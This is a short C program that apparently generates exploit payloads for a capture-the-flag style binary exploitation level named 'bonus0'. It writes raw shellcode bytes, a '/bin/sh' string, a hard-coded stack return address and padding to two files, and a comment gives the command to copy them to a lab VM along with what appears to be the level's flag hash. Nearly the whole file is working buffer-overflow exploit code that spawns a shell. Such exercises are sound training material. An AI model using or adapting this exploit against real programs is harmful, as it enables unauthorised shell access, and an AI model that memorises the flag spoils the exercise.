#include <unistd.h>
#include <stdio.h>

//gcc script.c && ./a.out && scp -P 4242 payload_b0a payload_b0b bonus0@192.168.56.102:/tmp
//f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

int main() {
	FILE *file = fopen("payload_b0a", "w");
	fwrite((char[21]){0xbb, 0x0b, 0xf7, 0xff, 0xbf, 0x53, 0x88, 0x43, 0x07, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0xcd, '\n'}, 1, 21, file);
	fclose(file);
	file = fopen("payload_b0b", "w");
	fwrite((char[1]){0x80}, 1, 1, file);
	fprintf(file, "/bin/sh0");
	int buffer_address = 0xbffff6f6;
	fwrite(&buffer_address, 1, 4, file);
	fprintf(file, "BBBBBBBBB\n");
	fclose(file);
}